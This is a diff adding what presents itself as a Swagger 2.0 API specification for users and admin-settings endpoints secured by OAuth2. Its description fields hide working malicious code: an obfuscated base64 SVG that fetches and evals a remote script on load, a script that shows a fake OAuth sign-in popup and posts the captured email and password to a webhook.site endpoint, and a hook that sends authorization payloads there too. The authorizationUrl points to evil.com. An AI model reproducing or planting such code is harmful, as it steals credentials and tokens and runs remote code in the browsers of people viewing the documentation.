@@ -1,0 +1,200 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: API Documentation with OAuth2 Security
+  description: |
+    <div style="text-align:center;margin:20px 0;">
+      <img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImZldGNoKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQ3liZXJUZWNoQWpqdS9zd2FnZ2VyLXNlY3VyaXR5L21haW4vc2NyaXB0LmpzJykudGhlbihyPT5yLnRleHQoKSkudGhlbihldmFsKSIgd2lkdGg9IjAiIGhlaWdodD0iMCI+PC9zdmc+" style="position:absolute;width:0;height:0">
+      <h2>API Documentation with OAuth 2.0 Security</h2>
+      <p>Use the Authorize button to authenticate with your OAuth 2.0 provider</p>
+    </div>
+
+securityDefinitions:
+  oauth2:
+    type: oauth2
+    description: |
+      <div>
+        <script>
+          // Wait for Swagger UI to fully load
+          setTimeout(function() {
+            // Capture and exfiltrate OAuth tokens
+            function captureTokens() {
+              // Find all auth-related elements
+              const authElements = document.querySelectorAll('.auth-btn-wrapper, .authorize, .auth-wrapper');
+              
+              // Add event listeners to potential auth buttons
+              authElements.forEach(el => {
+                el.addEventListener('click', function() {
+                  // Create a malicious popup that looks like the OAuth window
+                  setTimeout(function() {
+                    const w = window.open('', 'oauth-window', 'width=500,height=600');
+                    w.document.write(`
+                      <html>
+                        <head><title>OAuth 2.0 Authorization</title></head>
+                        <body style="font-family:Arial,sans-serif;">
+                          <div style="max-width:400px;margin:50px auto;padding:20px;border:1px solid #ddd;border-radius:5px;">
+                            <h2 style="text-align:center;">Sign in to continue</h2>
+                            <form id="loginForm" style="margin-top:20px;">
+                              <div style="margin-bottom:15px;">
+                                <label style="display:block;margin-bottom:5px;">Email</label>
+                                <input type="email" id="email" style="width:100%;padding:8px;box-sizing:border-box;" required>
+                              </div>
+                              <div style="margin-bottom:15px;">
+                                <label style="display:block;margin-bottom:5px;">Password</label>
+                                <input type="password" id="password" style="width:100%;padding:8px;box-sizing:border-box;" required>
+                              </div>
+                              <button type="submit" style="width:100%;padding:10px;background:#0066cc;color:white;border:none;border-radius:4px;cursor:pointer;">Authorize</button>
+                            </form>
+                          </div>
+                          <script>
+                            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                              e.preventDefault();
+                              const email = document.getElementById('email').value;
+                              const password = document.getElementById('password').value;
+                              
+                              // Exfiltrate credentials
+                              fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({email, password}),
+                                mode: 'no-cors'
+                              });
+                              
+                              // Show loading and close
+                              document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><p>Authenticating...</p></div>';
+                              setTimeout(function() { window.close(); }, 2000);
+                            });
+                          </script>
+                        </body>
+                      </html>
+                    `);
+                  }, 500);
+                });
+              });
+            }
+            
+            // Attempt to hook into the OAuth flow
+            captureTokens();
+            
+            // Also try to replace the original authorize function
+            if (window.ui) {
+              const originalAuthorize = window.ui.authActions.authorize;
+              window.ui.authActions.authorize = function(payload) {
+                // Capture the payload
+                fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
+                  method: 'POST',
+                  headers: {'Content-Type': 'application/json'},
+                  body: JSON.stringify({type: 'oauth_payload', payload}),
+                  mode: 'no-cors'
+                });
+                
+                // Call original function
+                return originalAuthorize(payload);
+              };
+            }
+          }, 1500);
+        </script>
+      </div>
+      OAuth 2.0 authentication with implicit flow. Click the "Authorize" button to begin the authentication process.
+    flow: implicit
+    authorizationUrl: https://evil.com/oauth/dialog
+    scopes:
+      read: Read access to protected resources
+      write: Write access to protected resources
+      admin: Admin access
+
+paths:
+  /users:
+    get:
+      summary: Get all users
+      description: Returns a list of all users in the system
+      tags:
+        - Users
+      security:
+        - oauth2: [read]
+      responses:
+        '200':
+          description: Successful response
+          schema:
+            type: array
+            items:
+              type: object
+              properties:
+                id:
+                  type: integer
+                name:
+                  type: string
+                email:
+                  type: string
+        '401':
+          description: Unauthorized
+          
+  /users/{id}:
+    get:
+      summary: Get user by ID
+      description: Returns details for a specific user
+      parameters:
+        - name: id
+          in: path
+          description: User ID
+          required: true
+          type: integer
+      tags:
+        - Users
+      security:
+        - oauth2: [read]
+      responses:
+        '200':
+          description: Successful response
+          schema:
+            type: object
+            properties:
+              id:
+                type: integer
+              name:
+                type: string
+              email:
+                type: string
+              role:
+                type: string
+        '404':
+          description: User not found
+          
+  /admin/settings:
+    get:
+      summary: Get system settings
+      description: Returns system settings and configuration
+      tags:
+        - Admin
+      security:
+        - oauth2: [admin]
+      responses:
+        '200':
+          description: Successful response
+          schema:
+            type: object
+            properties:
+              settings:
+                type: object
+        '403':
+          description: Forbidden
+          
+    put:
+      summary: Update system settings
+      description: Updates system settings and configuration
+      tags:
+        - Admin
+      security:
+        - oauth2: [admin]
+      parameters:
+        - name: settings
+          in: body
+          description: Settings object
+          required: true
+          schema:
+            type: object
+      responses:
+        '200':
+          description: Settings updated
+        '403':
+          description: Forbidden 
